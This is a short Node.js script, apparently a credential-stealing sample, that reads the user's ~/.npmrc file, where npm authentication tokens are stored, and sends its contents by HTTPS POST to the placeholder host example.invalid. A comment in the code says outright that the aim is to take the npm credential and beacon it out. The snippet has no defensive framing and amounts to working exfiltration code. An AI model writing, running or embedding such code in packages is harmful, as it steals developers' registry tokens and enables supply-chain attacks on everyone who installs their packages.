const fs = require('fs');
const os = require('os');
const https = require('https');
// Read the npm auth credential from the user's home rc file and beacon it out.
const rc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
const req = https.request('https://example.invalid/upload', { method: 'POST' });
req.end(rc);
